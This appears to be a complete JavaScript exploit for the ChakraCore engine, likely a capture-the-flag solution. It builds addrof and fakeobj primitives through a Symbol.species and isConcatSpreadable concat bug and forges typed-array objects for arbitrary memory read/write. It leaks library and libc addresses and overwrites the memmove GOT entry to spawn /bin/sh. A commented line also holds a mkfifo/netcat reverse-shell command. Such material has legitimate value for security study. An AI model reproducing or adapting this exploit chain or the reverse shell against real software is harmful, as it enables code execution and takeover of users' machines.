// NOTE: Being my first js exploit, I did take major ideas on how to write properly from https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba and pwnjs examples
// + addrof
// + fakeobj
// + get vtable or chakrabase
// + arb r/w (this can be done using array, we just need to get the type pointer correct or leak someone else :P)
// + leak libc
// + get shell


// Helper Functions
function lower(x) {
	return parseInt(x.toString(16).padStart(16, "0").substr(-8, 8), 16) >> 0;
}

function upper(x) {
	return parseInt(x.toString(16).padStart(16, "0").substr(0, 8), 16) >> 0;
}

function makeu64(upper, lower) {
	return parseInt((upper >>> 0).toString(16) + (lower >>> 0).toString(16), 16);
}

function cloneFunc(func) {
	var reFn = /^function\s*([^\s(]*)\s*\(([^)]*)\)[^{]*\{([^]*)\}$/gi
		, s = func.toString().replace(/^\s|\s$/g, '')
		, m = reFn.exec(s);
	if (!m || !m.length) return;
	var conf = {
		name : m[1] || '',
		args : m[2].replace(/\s+/g,'').split(','),
		body : m[3] || ''
	}
	var clone = Function.prototype.constructor.apply(this, [].concat(conf.args, conf.body));
	return clone;
}

function fakeobj_(addr) {
	var a = [1, 2];
	var b = [lower(addr), upper(addr)];


	var fn = new Function();
	fn[Symbol.species] = function () {
		qq = [];
		return qq;
	};
	a.constructor = fn;

	fakeProp = {get: function () {
		qq[0] = new Object();
		return true;
	}};

	Object.defineProperty(b, Symbol.isConcatSpreadable, fakeProp);

	var c = a.concat(b);
	return c[1];
}

function addrof_(obj) {
	var a = [1,2,3];
	var b = [4,5,6];

	var fn = new Function();
	fn[Symbol.species] = function () {
		qq = [];
		return qq;
	};
	a.constructor = fn;

	fakeProp = {get: function () {
		b[1] = obj;
		qq[0] = obj;
		return true;
	}};

	Object.defineProperty(b, Symbol.isConcatSpreadable, fakeProp);

	var c = a.concat(b);
	addr = makeu64(c[1], c[0]); // c[1].toString(16) + (c[0] >>> 0).toString(16);
	// console.log(addr.toString(16))
	return addr;
};

function fakeobj(addr) {
	fakeobj_ = cloneFunc(fakeobj_);
	return fakeobj_(addr);
}

function addrof(obj) {
	addrof_ = cloneFunc(addrof_);
	return addrof_(obj);
}


function leak_vtable() {
	var arr = new Array(16);
	for(var i = 0; i < 18; i++) {
		arr[i] = 0;
	}

	var brr = new Array(16);
	for(var i = 0; i < 18; i++) {
		brr[i] = 0;
	}

	var addr = addrof(arr);


	// DataView object
	// // vtable
	// obj[0] = 0; obj[1] = 0;
	// // type
	// obj[2] = lower(addr) + 0x68; obj[3] = upper(addr);
	// // some ptr
	// obj[4] = 56; obj[5] = 0;
	// // some ptr
	// obj[6] = lower(addr); obj[7] = upper(addr);
	// // length
	// obj[8] = 0x200; obj[9] = 0;
	// // pointer to arraybuffer object
	// obj[10] = lower(addr); obj[11] = upper(addr);
	// //
	// obj[12] = 0; obj[13] = 0;
	// // somepointer on heap
	// obj[14] = lower(addr); obj[15] = upper(addr);

	//// array
	// // vtable
	// obj[0] = lower(addr); obj[1] = upper(addr);
	// // type
	// obj[2] = lower(addr) + 0x68; obj[3] = upper(addr);
	// // some ptr
	// obj[4] = 0x1d; obj[5] = 0;
	// // some ptr
	// obj[6] = lower(addr) - 0x420 + 0x98; obj[7] = upper(addr);
	// // length
	// obj[8] = 0x100; obj[9] = 0;
	// // pointer to arraybuffer object
	// obj[10] = lower(addr); obj[11] = upper(addr);
	// //
	// obj[12] = lower(addr); obj[13] = upper(addr);
	// // somepointer on heap
	// obj[14] = 0; obj[15] = 0;
	// obj[16] = lower(addr) - 0x560 + 0x68; obj[17] = upper(addr); // 98

	// string object
	// obj[0] = 0; obj[1] = 0;
	// // type
	// obj[2] = lower(addr) + 0x68 + 0x10; obj[3] = upper(addr);
	// // some ptr
	// obj[4] = lower(addr); obj[5] = upper(addr);
	// // some ptr
	// obj[6] = 8; obj[7] = 0;
	// //
	// obj[8] = 7; obj[9] = 0;
	// obj[10] = 0x41424241; obj[11] = 0x41424241;


	// UInt64Number <vtable><type><value>
	arr[0] = 6;
	arr[16] = lower(addr) + 0x58;	arr[17] = upper(addr);

	leak = parseInt(fakeobj(addr + 0x90));
	return leak;
}

uint32_vtable_offset = 0xd457d8;
arraybuffer_vtable_offset = 0xd57da0;

libchakracore_base = leak_vtable() - 0xd5db40;
console.log(libchakracore_base.toString(16));

uint32_vtable = libchakracore_base + uint32_vtable_offset;
arraybuffer_vtable = libchakracore_base + arraybuffer_vtable_offset;

mprotect_got_offset = 0xd9b070;

///////////////////////////////////////////////////////////////////

function get_rw() {
	var ar = new Array(16);
	for(var i=0; i<18;i++) {ar[i] = 0;}
	var br = new Array(16);
	for(var i=0; i<18;i++) {br[i] = 0;}
	var cr = new Array(16);
	for(var i=0; i<18;i++) {cr[i] = 0;}
	var dr = new Array(16);
	for(var i=0; i<18;i++) {dr[i] = 0;}

	ar_addr = addrof(ar);
	br_addr = addrof(br);
	cr_addr = addrof(cr);
	dr_addr = addrof(dr);


	target = 0x4141414141414141;// libchakracore_base + mprotect_got_offset; // ar_addr;

	// // Uint32Array -- 0x30
	// // <vtable> <type>
	// // <0> <0>
	// // <length> <array_buffer_ptr>
	// // <bytes_per_element> <buffer>
	ar[0] = lower(uint32_vtable);	ar[1] = upper(uint32_vtable);
	ar[2] = lower(cr_addr) + 0x58;	ar[3] = upper(cr_addr);
	ar[4] = 0;			ar[5] = 0;
	ar[6] = 0;			ar[7] = 0;
	ar[8] = 0x100;			ar[9] = 0;
	ar[10] = lower(br_addr + 0x58);	ar[11] = upper(br_addr);
	ar[12] = 4;			ar[13] = 0;
	ar[14] = lower(target);		ar[15] = upper(target);

	// ArrayBuffer -- 0x29
	// <vtable> <type>
	// <0> <0>
	// <parent> <other parent>
	// <actual buffer> <buffer length>
	br[0] = lower(arraybuffer_vtable);	br[1] = upper(uint32_vtable); // vtable
	br[2] = lower(dr_addr) + 0x58;		br[3] = upper(dr_addr); // type
	br[4] = 0;				br[5] = 0;
	br[6] = 0;				br[7] = 0;
	br[8] = 0;				br[9] = 0; // parent
	br[10] = 0;				br[11] = 0; // other_parent
	br[12] = lower(target);			br[13] = upper(target); // buffer
	br[14] = 0x100 * 4;			br[15] = 0; // buffer length

	cr[0] = 0x30;	cr[1] = 0;
	cr[2] = lower(cr_addr) - 0x420 + 0x80;	cr[3] = upper(cr_addr);
	cr[6] = lower(libchakracore_base) + 0x7aa050;	cr[7] = upper(libchakracore_base);

	dr[0] = 0x29;	dr[1] = 0;
	cr[2] = lower(dr_addr) - 0x420 + 0x80;	cr[3] = upper(dr_addr);
	dr[6] = lower(libchakracore_base) + 0x7aa050;	dr[7] = upper(libchakracore_base);

	z = fakeobj(ar_addr + 0x58);
	var mem = {
		z: fakeobj(ar_addr + 0x58),
		setaddr: function(addr) {
			ar[14] = lower(addr);
			ar[15] = upper(addr);
		},
		read32: function(addr) {
			mem.setaddr(addr);
			return z[0];
		},
		read64: function(addr) {
			mem.setaddr(addr);
			return makeu64(z[1], z[0]);
		},
		write32: function(addr, val) {
			mem.setaddr(addr);
			z[0] = val;
		},
		write64: function(addr, val) {
			mem.setaddr(addr);
			z[0] = lower(val);
			z[1] = upper(val);
		}
	};
	return mem;
}

zz = get_rw();
mprotect_libc = zz.read64(libchakracore_base + mprotect_got_offset);

libc = mprotect_libc - 0x101770;
console.log(libc.toString(16));

memmove_got_offset = 0xd9b0f0;
memmove_got = libchakracore_base + memmove_got_offset;

zz.write64(memmove_got, libc + 0x45390);

var az = new Uint8Array(100);
var bz = new Uint8Array(10);

for(var i = 0; i < 100; i++) {az[i] = 0;}

cmd = "/bin/sh"
// cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc localhost 1337  >/tmp/f";

for(var i = 0; i < cmd.length; i++) {az[i] = cmd.charCodeAt(i);}
az.set(bz);
